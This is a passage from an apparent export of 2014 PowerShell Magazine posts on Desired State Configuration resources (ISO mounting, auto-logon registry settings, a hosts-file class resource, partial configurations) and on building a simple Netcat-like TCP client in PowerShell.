$Configuration.Add('Ensure','Present') } else { $Configuration.Add('Ensure','Absent') } } $Configuration } Function Set-TargetResource { [CmdletBinding()] param ( [Parameter(Mandatory)] [string] $ImagePath, [Parameter(Mandatory)] [string] $DriveLetter, [Parameter()] [ValidateSet('Present','Absent')] [string] $Ensure = 'Present' ) $DriveLetter = $DriveLetter + ':' if ($Ensure -eq 'Present') { Write-Verbose \u0026quot;Mounting Disk image\u0026quot; $DiskImage = Mount-DiskImage -ImagePath $ImagePath -NoDriveLetter -PassThru -ErrorAction Stop | Get-Volume $DiskVolume = Get-CimInstance -ClassName Win32_Volume | Where-Object { $_.DeviceID -eq $DiskImage.ObjectId } Write-Verbose \u0026quot;Setting Drive Letter\u0026quot; Set-CimInstance -Property @{DriveLetter= $DriveLetter } -InputObject $DiskVolume -ErrorAction Stop } else { Write-Verbose \u0026quot;Dismounting disk image\u0026quot; Dismount-DiskImage -ImagePath $ImagePath } } Function Test-TargetResource { [CmdletBinding()] [OutputType([Boolean])] param ( [Parameter(Mandatory)] [ValidateScript( { ([System.IO.Path]::GetExtension($_) -eq '.iso') -and (Test-Path $_) } )] [string] $ImagePath, [Parameter(Mandatory)] [ValidateScript({-not (Test-Path $_)})] [string] $DriveLetter, [Parameter()] [ValidateSet('Present','Absent')] [string] $Ensure = 'Present' ) $DiskImage = Get-DiskImage -ImagePath $ImagePath -ErrorAction Stop if ($DiskImage.Attached) { if (($DiskImage | Get-Volume).DriveLetter -eq $DriveLetter) { $MountExists = $true Write-Verbose 'Disk image is mounted with the same drive letter' } else { $MountExists = $false Write-Verbose 'Disk image is mounted but with a different drive letter' } } if ($MountExists) { if ($Ensure -eq 'Present') { Write-Verbose 'disk image is already mounted. No action needed' $true } else { Write-Verbose 'disk image is mounted while it should not' $false } } else { if ($Ensure -eq 'Absent') { Write-Verbose 'disk image is not mounted. No action needed' $true } else { Write-Verbose 'disk image is not mounted while it should' $false } } } Export-ModuleMember -Function *-TargetResource This is simple. In the Set-TargetResource function, I used Set-CimInstance cmdlet to set the drive letter I need for the mounted image.\n[ClassVersion(\u0026quot;1.0\u0026quot;), FriendlyName(\u0026quot;DiskImage\u0026quot;)] class DiskImage : OMI_BaseResource { [Key] string ImagePath; [Key] string DriveLetter; [write,ValueMap{\u0026quot;Present\u0026quot;, \u0026quot;Absent\u0026quot;},Values{\u0026quot;Present\u0026quot;, \u0026quot;Absent\u0026quot;}] string Ensure; }; If you observe the above MOF schema definition, I have defined both ImagePath and DriveLetter as Key properties which means a combination of these two identifies a unique configuration. Without this, if a image is already mounted, I still have to go and search for its drive letter. By making this a composite key, if that combination is not configured already, I just go configure it. Simple! If the image is mounted already with a different drive letter, re-mounting it changes the driver letter. Simple, again! 🙂\nSo, here is how you use this resource\nConfiguration DiskImageDemo { Import-DscResource -Module PSMag DiskImage ISO { ImagePath = 'C:\\Images\\en_windows_server_2012_r2_with_update_x64_dvd_4065220.iso' DriveLetter = 'Z' Ensure = \u0026quot;Absent\u0026quot; } } DiskImageDemo Here is the output from one such configuration enact process.\nAs you know, Mount-DiskImage can be used to mount VHDX and VHD files too. So, this resource can be easily updated to add that support as well. Watch this space.\nYou can download this DSC resource from my Github repository.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/10/15/dsc-resource-for-mounting-and-dismounting-iso-images/","tags":["PowerShell DSC"],"title":"DSC Resource for Mounting and Dismounting ISO images"},{"categories":["PowerShell DSC"],"contents":"For my lab setup, I sometimes need to enable auto administrator logon during OS and application deployment. I use DSC for most part of this automation and what is better than a DSC resource for this?\nAuto administrator logon is enabled by making changes to the HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon registry key. To enable auto administrator logon, we need to add the following values:\n AutoAdminLogon (REG_SZ) with a value of 1 DefaultUserName (REG_SZ) with the user name as the value DefaultPassword (REG_SZ) with the user password as the value DefaultDomainName (REG_SZ) with the domain name of the user as the value  To disable auto administrator logon, we can simply set the AutoAdminLogon to 0 or delete all the above values. Now, coming back to DSC, there is a DSC registry resource. So, there is no need to re-invent the wheel. Instead, we can simply create a composite resource to do this. The following configuration script combines all the registry entries that need to be configured for the auto administrator logon.\nConfiguration AutoAdminLogon { Param ( [Parameter(Mandatory)] [PSCredential] $AutoAdminCredential, [Parameter()] [ValidateSet(\u0026quot;Present\u0026quot;,\u0026quot;Absent\u0026quot;)] [String]$Ensure = \u0026quot;Present\u0026quot; ) $Key = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' #Get the default domain name from the credential object if ($AutoAdminCredential.GetNetworkCredential().Domain) { $DefaultDomainName = $AutoAdminCredential.GetNetworkCredential().Domain } else { $DefaultDomainName = \u0026quot;\u0026quot; } Registry DefaultDomainName { Ensure = $Ensure Key = $Key ValueName = 'DefaultDomainName' ValueData = $DefaultDomainName } Registry DefaultUserName { Ensure = $Ensure Key = $Key ValueName = 'DefaultUserName' ValueData = $AutoAdminCredential.GetNetworkCredential().UserName } Registry DefaultPassword { Ensure = $Ensure Key = $Key ValueName = 'DefaultPassword' ValueData = $AutoAdminCredential.GetNetworkCredential().Password } Registry AutoAdminLogon { Ensure = $Ensure Key = $Key ValueName = 'AutoAdminLogon' ValueData = 1 } } In the above configuration, I have used PSCredential type to collect the username and password instead of plain-text strings. Also, the Ensure value indicates whether we want to set the auto administrator logon or remove it. These are the only two parameters we need. The DefaultDomainName will be derived from the PSCredential object. The default ValueType for registry values is REG_SZ and there is no need to provide that property within the resource instance configuration.\nTo be able to use this configuration as a composite resource, we need to save it as .Schema.psm1. In my example, I saved it as AutoAdminLogon.Schema.psm1. Then, we need to create a module manifest for this. This can be done using the New-ModuleManifest cmdlet.\nNew-ModuleManifest -Path .\\AutoAdminLogon.psd1 -RootModule .\\AutoAdminLogon.Schema.psm1  Once we have the manifest file created, we need to store this in the modules location. Here is how I stored it.\nWe need to create a DSCResources folder and store the PSM1 and PSD1 files under that. This can, now, be used to configure AutoAdminLogon using DSC. Here is a sample configuration script:\n$ConfigData = @{ AllNodes = @( @{ NodeName = \u0026quot;*\u0026quot;; PsDscAllowPlainTextPassword = $true }, @{ NodeName = 'WMF5-1' } ) } Configuration Demo { Param ( [pscredential] $AutoAdminCredential ) Import-DscResource -Name AutoAdminLogon AutoAdminLogon Demo2 { AutoAdminCredential = $AutoAdminCredential Ensure = \u0026quot;Present\u0026quot; } } Demo -ConfigurationData $ConfigData -AutoAdminCredential (Get-Credential) This configuration script ensures that auto administrator logon gets set on the target system. I have used plain-text credentials in this example. However, this should work seamlessly with encrypted credentials as well.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/10/07/dsc-composite-resource-for-auto-administrator-logon/","tags":["PowerShell DSC"],"title":"DSC composite resource for auto administrator logon"},{"categories":["PowerShell DSC"],"contents":"By now, it should be no surprise that WMF 5.0 Preview added support for defining classes and user-defined data types. This is done using the formal syntax and semantics that you find in an object-oriented programming language. As per the September 2014 Preview release notes, the following are the supported scenarios:\n Define DSC resources and their associated types by using the Windows PowerShell language. Define custom types in Windows PowerShell by using familiar object-oriented programming constructs, such as classes, properties, methods, inheritance, etc. Debug types by using the Windows PowerShell language. Generate and handle exceptions by using formal mechanisms, and at the right level.  In this article, I will explain how to use classes in Windows PowerShell to define DSC resources. If you have written DSC resources using the PowerShell script module semantics, you will certainly appreciate how simple it is now to write and package a DSC resource.\n You don’t have to create a schema MOF any more A DSCResource folder inside the module folder is not needed anymore You can now package multiple DSC resources in a single module script file  From a semantics point of view, the earlier script module needed three functions:\n Get-TargetResource Set-TargetResource Test-TargetResource  Within these three functions, we needed to define all key and required properties in each function. For example, the Test-TargetResource and Set-TargetResource functions must have the same number of parameters defined while Get-TargetResource needs all the key and required properties. This is a lot of redundant code depending on how many properties you have.\nAlthough the xDSCResourceDesigner module helped generate lot of skeleton code including the schema MOF, many were still confused about the need for schema MOF and the exact syntax for these functions. This is where the new class-defined DSC resources come into picture. To this extent, WMF 5.0 added new language elements. In today’s article, we will see only what is relevant for the DSC resource demonstration.\nThe first one is the Class keyword. This keyword is a true .NET type and all its members are public within the module scope. Here is a simple example. This just defines the class with no members.\nclass DSCDemo { } The second keyword is Enum. Using this, we can define new enumerations.\nenum Test { Success = 0 Failure = 1 Unknown = 10 }  The other language extensions for DSC resources include three attributes for defining resource properties.\n DscResource indicates that the class definition following the attribute is a DSC resource DscResourceKey indicates that the property is a DSC key property. This is equivalent to Key qualifier in the legacy MOF schema files DscResourceMandatory indicates that the property is a required property. This is equivalent to Required qualifier in the legacy MOF schema files.  With this knowledge, let us see how we can create a class-defined DSC resource. The following code snippet shows a skeleton for a DSC resource.\nenum Ensure { Absent Present } [DscResource()] class ResourceName { [DscResourceKey()] #Some Key Property [DscResourceMandatory()] #Some Mandatory property #Use of enumeration [Ensure] $Ensure #Set function similar to Set-TargetResource [void] Set() { #Set logic goes here } #Test function similar to Test-TargetResource [bool] Test() { #Test logic goes here } #Get function similar to Get-TargetResource [Hashtable] Get() { #Get logic goes here } } As you see above, the Get, Set, and Test functions map to Get-TargetResource, Set-TargetResource, and Test-TargetResource functions. The execution flow of the DSC resource itself did not change. Test function gets executed first and based on its return value (True or False), Set either gets skipped or executed. The Get function of a resource is used when the Get-DscConfiguration cmdlet is called.\nNow, let us build a functional resource from this skeleton. For the demonstration, I will show you the class-defined resource I built for managing hosts file on Windows.\nenum Ensure { Absent Present } [DscResource()] class HostsFile { [DscResourceKey()] [string] $IPAddress [DscResourceKey()] [string] $HostName [Ensure] $Ensure [void] Set() { $hostEntry = \u0026quot;`n${IPAddress}`t${HostName}\u0026quot; if($Ensure -eq [Ensure]::Present) { Write-Verbose \u0026quot;Adding a Hosts File entry\u0026quot; Add-Content -Path \u0026quot;${env:windir}\\system32\\drivers\\etc\\hosts\u0026quot; -Value $hostEntry -Force -Encoding ASCII Write-Verbose \u0026quot;Added a hosts File entry\u0026quot; } else { Write-Verbose \u0026quot;removing hosts file entry\u0026quot; ((Get-Content \u0026quot;${env:windir}\\system32\\drivers\\etc\\hosts\u0026quot;) -notmatch \u0026quot;^\\s*$\u0026quot;) -notmatch \u0026quot;^[^#]*$IPAddress\\s+$HostName\u0026quot; | Set-Content \u0026quot;${env:windir}\\system32\\drivers\\etc\\hosts\u0026quot; Write-Verbose \u0026quot;removed hosts file entry\u0026quot; } } [bool] Test() { try { Write-Verbose \u0026quot;Checking if hosts file exists\u0026quot; $entryExist = ((Get-Content \u0026quot;${env:windir}\\system32\\drivers\\etc\\hosts\u0026quot;) -match \u0026quot;^[^#]*$IPAddress\\s+$HostName\u0026quot;) if ($Ensure -eq \u0026quot;Present\u0026quot;) { if ($entryExist) { Write-Verbose \u0026quot;Hosts file entry does not exist\u0026quot; return $true } else { Write-Verbose \u0026quot;Hosts file entry does not exist while it should\u0026quot; return $false } } else { if ($entryExist) { Write-Verbose \u0026quot;Hosts file entry exists while it should not\u0026quot; return $false } else { Write-Verbose \u0026quot;Hosts file entry does not exist\u0026quot; return $true } } } catch { $exception = $_ Write-Verbose \u0026quot;Error occurred\u0026quot; while ($exception.InnerException -ne $null) { $exception = $exception.InnerException Write-Verbose $exception.message } } } [HostsFile] Get() { $Configuration = [hashtable]::new() $Configuration.Add(\u0026quot;IPAddress\u0026quot;,$IPAddress) $Configuration.Add(\u0026quot;HostName\u0026quot;,$HostName) Write-Verbose \u0026quot;Checking Hosts file entry\u0026quot; try { if ((Get-Content \u0026quot;${env:windir}\\system32\\drivers\\etc\\hosts\u0026quot;) -match \u0026quot;^[^#]*$IPAddress\\s+$HostName\u0026quot;) { Write-Verbose \u0026quot;Hosts file entry found\u0026quot; $Configuration.Add('Ensure','Present') } else { Write-Verbose \u0026quot;Hosts File entry not found\u0026quot; $Configuration.Add('Ensure','Absent') } } catch { $exception = $_ Write-Verbose \u0026quot;Error occurred\u0026quot; while ($exception.InnerException -ne $null) { $exception = $exception.InnerException Write-Verbose $exception.message } } return $Configuration } }  Now, all we need to do is copy the above code into a .PSM1 file and generate the module manifest using the New-ModuleManifest cmdlet. Once you are done, you can copy both these files into a folder with the same name as .PSM1 file under the module path. On my system, I saved these files as HostsFile.PSM1 and HostsFile.PSD1 and stored them under C:\\Program Files\\WindowsPowerShell\\Modules.\nIn the current implementation (September 2014 preview), the class-defined resources do not appear in the Get-DscResource cmdlet output. This is not implemented yet. However, you can use this resource in a configuration script by using Import-DscResource. Here is a sample configuration script.\nConfiguration Demo { Import-DscResource -Module HostsFile HostsFile Demo { IPAddress = \u0026quot;10.10.10.1\u0026quot; HostName = \u0026quot;TestHost10\u0026quot; Ensure = \u0026quot;Present\u0026quot; } HostsFile Demo1 { IPAddress = \u0026quot;10.10.10.110\u0026quot; HostName = \u0026quot;TestHost110\u0026quot; Ensure = \u0026quot;Present\u0026quot; } } Demo  This is it. We have a new class-defined DSC resource. If you want to add one more such resource to the same PSM1 file, you can simply add another class block and follow the same semantics as above. There is more than just creating this simple resource file. We will look into the other details of class-defined resources in a later post.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/10/06/class-defined-dsc-resources-in-windows-management-framework-5-0-preview/","tags":["PowerShell DSC"],"title":"Class-defined DSC resources in Windows Management Framework 5.0 Preview"},{"categories":["How To"],"contents":"I have been a long time Windows user and a PowerShell fan since it was introduced. I have always been aware of the range of useful tools regularly available to Unix/Linux users, but recently I started a new job where everything is built on Linux and Windows is barely mentioned. I now get to use all the tools Linux has to offer on a daily basis, but I still miss the rich metadata PowerShell passes along the pipe.\nOne tool I’ve found particularly handy in Linux is Netcat. While Netcat is capable of performing a variety of tasks, in essence it takes data from STDIN, forwards it over a TCP connection to a nominated server and port, and writes any response from the server to STDOUT.\nNetcat is useful for issuing requests to mail servers, web servers, software or hardware control ports, or almost any network-exposed service. For me however, Netcat is made most useful for two reasons: It is easily used within a script and it is installed-by-default in most Linux distributions I’ve used.\nThe tool most similar to Netcat to be included with Windows is the command-line Telnet Client, but it is not easily scriptable and in recent Windows versions it is an optional feature that needs to be intentionally installed.\nWith PowerShell’s tight integration with the full .NET Framework it is easy to quickly implement at least the basic behaviour of Netcat on Windows using the TcpClient and an Encoding. So easy, that I have written such a script, about 70 lines long (including formatting) in a little over an hour.\nMy script consists of essentially six sections. First is the parameter block, defining three mandatory parameters, and two optional. The three mandatory parameters are the name (or address) of the destination computer, the destination TCP port number, and the data to send. Technically the “Data” parameter is not marked as mandatory, but it would be somewhat pointless to omit it.\nfunction Send-NetworkData { [CmdletBinding()] param ( [Parameter(Mandatory)] [string] $Computer, [Parameter(Mandatory)] [ValidateRange(1, 65535)] [Int16] $Port, [Parameter(ValueFromPipeline)] [string[]] $Data, [System.Text.Encoding] $Encoding = [System.Text.Encoding]::ASCII, [TimeSpan] $Timeout = [System.Threading.Timeout]::InfiniteTimeSpan )  The two remaining optional parameters are the text encoding method and the response timeout which default to ASCII, and infinite respectively. While it was tempting to just hard-code these items, in PowerShell it’s just as easy to expose them as parameters and a user is likely to want to override these.\nThe second section of the script, is the “begin” block. I have separated the function body into the “begin”, “process”, and “end” blocks because I want to support the input data being piped in, just as someone might pipe the output of one program into Netcat in Linux.\nbegin { # establish the connection and a stream writer $Client = New-Object -TypeName System.Net.Sockets.TcpClient $Client.Connect($Computer, $Port) $Stream = $Client.GetStream() $Writer = New-Object -Type System.IO.StreamWriter -ArgumentList $Stream, $Encoding, $Client.SendBufferSize, $true }  In the begin block, I create a new TcpClient object, tell it to connect to the specified computer and port, and setup the StreamWriter object to be used for sending the data in the next section. I’m using a new .NET 4.5 constructor overload for StreamWriter so that it won’t close the underlying NetworkStream when I close the StreamWriter. I need this so I can still read the response from the stream.\nThe third section is the “process” block where I actually send the data on the network. Depending on how the user calls my function, the process block will be called in two different ways. If the user pipes data into my function, the process block will be called once for each item in the pipe. However, if the user calls my function and passes the data to the “Data” parameter directly, the process block will be called once only. Using the PowerShell “foreach” statement here handles both scenarios easily.\nprocess { # send all the input data foreach ($Line in $Data) { $Writer.WriteLine($Line) } } The fourth section, is the beginning of the “end” block. At this point, all the user-provided data has been received and then written to the network socket. All this section does is flush any buffered data, dispose the StreamWriter object, and shutdown the sending half of the TCP socket so the destination computer knows we’re done sending.\nend { # flush and close the connection send $Writer.Flush() $Writer.Dispose() $Client.Client.Shutdown('Send')  The fifth, and most complicated, section is responsible for receiving the response data from the server, if any. First, we configure the Stream with the maximum time to wait for a response. Next we create an empty string to hold the ultimate result, and a byte array buffer for reading raw chunks of the response from the stream.\n# read the response $Stream.ReadTimeout = [System.Threading.Timeout]::Infinite if ($Timeout -ne [System.Threading.Timeout]::InfiniteTimeSpan) { $Stream.ReadTimeout = $Timeout.TotalMilliseconds } $Result = '' $Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize do { try { $ByteCount = $Stream.Read($Buffer, 0, $Buffer.Length) } catch [System.IO.IOException] { $ByteCount = 0 } if ($ByteCount -gt 0) { $Result += $Encoding.GetString($Buffer, 0, $ByteCount) } } while ($Stream.DataAvailable -or $Client.Client.Connected) Write-Output $Result  Then, within a loop we read as much data as the buffer will hold, or as much data as there is available to read. If we receive some data we use the configured text encoding to convert the raw bytes to text and append it to the result. If an exception is thrown whilst reading data (typically because the read timeout expired) then we simply treat it as though no data was available.\nWe then check to see if there is still more data waiting to be read from the stream, or if the socket is still connected, and repeat the loop if either of these is true. If not, we write the aggregated result text to the standard output pipe.\n # cleanup $Stream.Dispose() $Client.Dispose() } }  In the sixth, and final section, the end of the “end” block and the end of the script, the Stream and TcpClient are both disposed. And that is it. There are probably many scenarios not well handled by this part of the script, but it copes with the simple situations I needed it for. For example, sending a simple HTTP 1.0 request to a web server and seeing the response:\n'GET / HTTP/1.0', '' | Send-NetworkData -Computer www.powershellmagazine.com -Port 80 There is much more that would be required to re-implement properly. Sending UDP instead of TCP, alternate line-endings, binary data, send delays, broadcasting to an array of ports, and support for SOCKS proxies would cover most of it. Netcat also supports listening on a port for incoming data as an ad-hoc server, but this would be best implemented by a separate PowerShell cmdlet, probably with a name starting with the “Receive” verb.\nThere is also room to make my script much more PowerShell-idiomatic. At the least, streaming the network response out as it arrives should be a useful (and reasonably easy) exercise for you, the reader. Other improvements may include returning the network response in objects containing timing or other connection metadata in addition to the response data itself.\nI suspect others in the software development services community have already implemented more of the Netcat functionality in their own PowerShell scripts than I have, and probably with fewer bugs. So for serious scenarios it would be worth looking around.\nHowever, if you simply wanted to see how to put something together quickly in PowerShell for sending network data, hopefully my script has served its purpose.\nThe full script, with more examples is available as a Gist on GitHub here: https://gist.github.com/jstangroome/9adaa87a845e5be906c8\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/10/03/building-netcat-with-powershell/","tags":["How To"],"title":""},{"categories":["PowerShell DSC"],"contents":"Windows Management Framework (WMF) 5.0 September 2014 Preview brought in many changes to Desired State Configuration (DSC). A couple of important changes include cross-computer synchronization and partial configurations. I had described the cross-computer synchronization in an earlier article. In today’s post, I will explain why we need partial configurations and how to use them.\nLet us start with a simple description to understand why we need partial configurations. I see a couple of reasons for this. For the purpose of demonstration and explanation, I will use SQL Server deployment and configuration as an example.\nIncremental Configurations Imagine we are deploying a SQL Server. Assume that we have already installed OS and we are using DSC to perform the post-OS deployment tasks. The first thing we’d need to do is make the target system a part of AD domain. Within the SQL configuration, we need to install .NET Framework 3.5 and invoke the SQL deployment, and complete SQL instance configuration. Optionally, OS and application service hardening might be required based on IT policies.\nWhat you see in the above picture represents the complete configuration of the target system. Also, as you see above, there are specific fragments of configuration. Although SQL installation depends on the OS configuration, we can still treat them as two completely different fragments. However, with the initial release of DSC, there was no way we could send partial configurations to a target system. That is, first send the OS configuration and then send the SQL configuration to the target system. If we send partial fragments of configuration, the most recently enacted configuration will be the one that is managed by DSC and everything else enacted before that cannot be monitored or managed using DSC any more. The workaround with the initial release was to deliver the OS fragment first and then update the same configuration script to add SQL configuration and deliver it again for enactment.\nThis is the first problem partial configurations in WMF 5.0 solves. Also, being able to deliver fragments of configuration is important for simulating orchestration experience with DSC.\nDelegated Control and Ownership While incremental configurations and ability to deliver fragments of configuration is important, the real benefit of partial configurations is in enabling delegated control and ownership. In a real world, the OS deployment and base OS configuration is done by folks or teams different from the people who install, configure, and manage SQL instances. Similar to these teams, there may be a security team that takes care of OS and application hardening configuration. With the earlier release, all these teams had to update the same configuration script. While collaboration is good, there is a huge room for errors. This can be solved effectively using partial configurations. Every team owns its configuration and manages it independent of others. In fact, with partial configurations, it is possible for these different teams even have their own pull server for delivering configurations to the target systems. Having multiple pull servers to deliver partial configurations is optional.\nNote: In the current implementation (WMF 5.0 September 2014 preview), partial configurations are supported only in pull mode of configuration delivery.\nNow that we understand the need for partial configurations, let us dive into how to use partial configurations. To start with, you need to understand the LCM settings that are used for DSC partial configuration.\nPartial Configurations in LCM Before we can deliver and enact a partial configuration fragment to a target system, the LCM on the target system must be made aware of the fragments. This is done by adding all partial configuration names and the respective pull server details to the LCM settings.\nWe will look at the new and updated LCM settings in a later post. But, for now we will discuss the PartialConfigurations property. As you see, this property is an array of CIM instances representing partial configurations. Since partial configurations work only in pull mode at the moment, we need to understand how to configure the target system LCM as a pull client. This configuration changed in WMF 5.0. Here is an example of LCM configuration that uses a REST endpoint as a pull server.\n[DSCLocalConfigurationManager()] Configuration SQLVMConfig { Node localhost { Settings { RefreshMode = \u0026quot;Pull\u0026quot; } ConfigurationRepositoryWeb PullSvc1 { Url = 'http://wmf5-1.sccloud.lab:8080/OSConfig/PSDSCPullServer.svc' AllowUnsecureConnection = $true } } } SQLVMConfig  The first thing you notice here is the new attribute called DSCLocalConfigurationManager(). This identifies the configuration script as the meta-configuration. When using this attribute, the LCM settings need to be placed in the Settings class. This resource is represented by the MSFT_DSCMetaConfigurationV2 class whereas the MSFT_DSCLocalConfigurationManager class represents the LCM settings in earlier release of DSC. This class is still available and you can use the old style of configuring LCM in WMF 5.0 too.\nThe ConfigurationRespositoryShare and ConfigurationRepositoryWeb are used to specify the SMB and REST pull service configuration respectively. For today’s post, we will limit our discussion to REST-based pull server. With WMF 5.0, you can specify multiple pull server configurations. So, to add one more pull server configuration, we just add another ConfigurationRespositoryWeb resource instance.\n[DSCLocalConfigurationManager()] configuration SQLVMConfig { Node localhost { Settings { RefreshMode = \u0026quot;Pull\u0026quot; } ConfigurationRepositoryWeb PullSvc1 { URL = 'http://wmf5-1.sccloud.lab:8080/OSConfig/PSDSCPullServer.svc' AllowUnsecureConnection = $true } ConfigurationRepositoryWeb PullSvc2 { URL = 'http://wmf5-2.sccloud.lab:8080/SQLConfig/PSDSCPullServer.svc' AllowUnsecureConnection = $true } } } SQLVMConfig  Now that we understand how to add pull server configuration, let us look at the partial configuration settings. So, for the purpose of this demonstration, I assume that we have a VM with Windows Server 2012 R2 installed and the network configuration is complete so that it can join an AD domain. We will create two configuration fragments–OSConfig and SQLConfig. The OS fragment configures the target system as a domain-joined computer and the SQL fragment installs SQL Server bits. Before we deliver this configuration using pull mode, we need to configure LCM so that it is aware of the configuration fragments.\n[DSCLocalConfigurationManager()] configuration SQLVMConfig { Node localhost { Settings { RefreshMode = \u0026quot;Pull\u0026quot; ConfigurationID = 'a5f86baf-f17f-4778-8944-9cc99ec9f992' RebootNodeIfNeeded = $true } ConfigurationRepositoryWeb PullSvc1 { URL = 'http://wmf5-1.sccloud.lab:8080/OSConfig/PSDSCPullServer.svc' AllowUnSecureConnection = $true } ConfigurationRepositoryWeb PullSvc2 { URL = 'http://wmf5-2.sccloud.lab:8080/SQLConfig/PSDSCPullServer.svc' AllowUnsecureConnection = $true } PartialConfiguration OSConfig { Description = 'Configuration for the Base OS' ConfigurationSource = '[ConfigurationRepositoryWeb]PullSvc1' } PartialConfiguration SQLConfig { Description = 'Configuration for the SQL Server' ConfigurationSource = '[ConfigurationRepositoryWeb]PullSvc2' DependsOn = '[PartialConfiguration]OSConfig' } } } SQLVMConfig  As you see in the above code snippet, the PartialConfiguration resource instances are created for both OS and SQL configuration. We also place a dependency on the OS partial configuration before the SQL configuration fragment can be enacted. Notice the value of ConfigurationSource property. It is written the same way we add values to DependsOn property. In OSConfig and SQLConfig partial configurations, we have specified different pull server configuration sources. This is in the form of [ResourceName]ResourceIdentifier format.\nWhile authoring the partial configurations, the configuration name must match the identifier associated with the partial configurations defined in the LCM. In the above example, the configurations should be named OSConfig and SQLConfig. Once we have the meta-configuration created, we can run the script to generate the meta-configuration MOF. This can be enacted using the Set-DscLocalConfigurationManager cmdlet. Here is how the LCM configuration looks after I updated the meta-configuration.\nWe have the necessary LCM configuration complete to deliver partial fragments of configurations. The following sections look at the actual node configuration fragments for OS and SQL configurations. We will start with OS configuration.\nNote: For the following code demonstration, you will require DSC Resource Kit xComputer and xSqlServerInstall resources. You can download most recent wave of these resources at: http://gallery.technet.microsoft.com/site/search?f%5B0%5D.Type=Tag\u0026amp;f%5B0%5D.Value=DSC%20Resource%20Kit%20Wave-7\u0026amp;f%5B0%5D.Text=DSC%20Resource%20Kit%20Wave-7. Also, this article assumes that you have a target system that has all necessary IP configuration to connect to a domain and has access to SQL Server installation bits. Also, this system must have WMF 5.0 Preview September 2014 installed. If you want to use DSC to do that, check out my earlier article on that.\nAlso, note that in the meta-configuration, I have set the RebootNodeIfNeeded property $true. This ensures that the target system reboots if a resource instance configuration requires.\nOS Configuration Fragment Within the OS configuration, we want the target system to join a domain. This is enough for our demo purpose. Here is how the configuration looks.\n$ConfigData = @{ AllNodes = @( @{ NodeName = \u0026quot;*\u0026quot;; PsDscAllowPlainTextPassword = $true }, @{ NodeName = 'a5f86baf-f17f-4778-8944-9cc99ec9f992' } ) } Configuration OSConfig { Param ( $Credential ) Import-DscResource -ModuleName xComputerManagement Node $AllNodes.NodeName { xComputer ADJoin { Name = 'WMF5-3' DomainName = 'sccloud.lab' Credential = $Credential } } } OSConfig -ConfigurationData $ConfigData -Credential (Get-Credential) -OutputPath 'C:\\Program Files\\WindowsPowerShell\\DscService\\Configuration' New-DSCCheckSum -ConfigurationPath 'C:\\Program Files\\WindowsPowerShell\\DscService\\Configuration' -OutPath 'C:\\Program Files\\WindowsPowerShell\\DscService\\Configuration'  The above configuration script adds the target system to a domain. We are using plain-text credentials in the configuration. Note that this is only for testing purpose and should not be used in production. The next configuration fragment we need is the SQLConfig which installs .NET Framework 3.5 and SQL Server software.\nSQL Configuration Fragment In the SQL configuration fragment, we want to install .NET Framework 3.5 and then proceed to installing SQL Server software. Here is the configuration script for this.\n$ConfigData = @{ AllNodes = @( @{ NodeName = \u0026quot;*\u0026quot;; PsDscAllowPlainTextPassword = $true }, @{ NodeName = 'a5f86baf-f17f-4778-8944-9cc99ec9f992' } ) } Configuration SQLConfig { Param ( $Credential ) Import-DscResource -ModuleName xSqlPS Node $AllNodes.NodeName { WindowsFeature NET35 { Name = 'NET-Framework-Core' Source = 'D:\\Sources\\Sxs' Ensure = 'Present' } xSqlServerInstall SQLInstall { InstanceName = \u0026quot;SQLDemo\u0026quot; SourcePath = \u0026quot;E:\\\u0026quot; Features= \u0026quot;SQLEngine,SSMS\u0026quot; SqlAdministratorCredential = $credential DependsOn = '[WindowsFeature]NET35' } } } SQLConfig -ConfigurationData $ConfigData -Credential (Get-Credential) -OutputPath 'C:\\Program Files\\WindowsPowerShell\\DscService\\Configuration' New-DSCCheckSum -ConfigurationPath 'C:\\Program Files\\WindowsPowerShell\\DscService\\Configuration' -OutPath 'C:\\Program Files\\WindowsPowerShell\\DscService\\Configuration'  In the above configuration script, I have given the external source path for .NET Framework bits and SQL Server. You need to replace this with whatever is applicable on your target system. Also, you need to pass the credentials that need to be used as the SQL administrator credentials. The xSqlServerInstall resource has many other properties but this is the minimum that is required.\nWith the above configuration fragment scripts, we have also generated the MOF and the checksum files. These files are generated in the form of GUID.mof and _GUID.mof.checksum _where GUID is the value of LCM ConfigurationID property on the target system. While this works with normal pull server configuration, we need something more with partial configurations. We need to prefix these files with the configuration name mentioned in the LCM PartialConfigurations property. So, in my demo, this is how it looks.\nWithout this prefix, the pull client would not be able to identify and download the partial configurations. Once you have all these ingredients ready, we can either wait for the LCM pull client refresh internal to kick in or manually invoke the configuration check. The latter is what I did. This can be done by calling either PerformRequiredConfigurationChecks CIM method of the LCM or using Update-DscConfiguration cmdlet.\nInvoke-CimMethod -Name PerformRequiredConfigurationChecks -Namespace root/Microsoft/Windows/DesiredStateConfiguration -Arguments @{Flags=[Uint32]2} -ClassName MSFT_DscLocalConfigurationManager -Verbose #Or the DSC cmdlet Update-DscConfiguration -ComputerName WMF5-3 This method starts a consistency check on the target system which triggers partial configuration download. Since we configured the LCM to reboot as needed, the target system restarts after joining an AD domain. The SQL configuration starts as soon as the target system reboots and completes after a while. You can monitor DSC event logs to check the status of configuration.\nOnce the configuration is complete, I used the Trace-xDSCOperation cmdlet in the xDSCDiagnostics module to understand the sequence of events during the configuration run.\nThe partial configurations get download to the C:\\Windows\\System32\\Configuration\\PartialConfigurations folder. Once all partial configurations are successfully enacted, they get merged into a single configuration represented by current.mof.\nIt is also possible to incrementally update the LCM partial configurations instead of providing them upfront. This is useful in an orchestration scenario. In this case, the LCM enacts the first partial configuration it receives and copies that as current.mof. At this moment, you can update the LCM meta-configuration to include the remaining partial configurations which will be enacted during the next consistency check.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/10/02/partial-dsc-configurations-in-windows-management-framework-wmf-5-0/","tags":["PowerShell DSC"],"title":"Partial DSC Configurations in Windows Management Framework (WMF) 5.0"},{"categories":["Pester","DevOps"],"contents":"In this part of Pester basics series, I will cover the most powerful tool from the 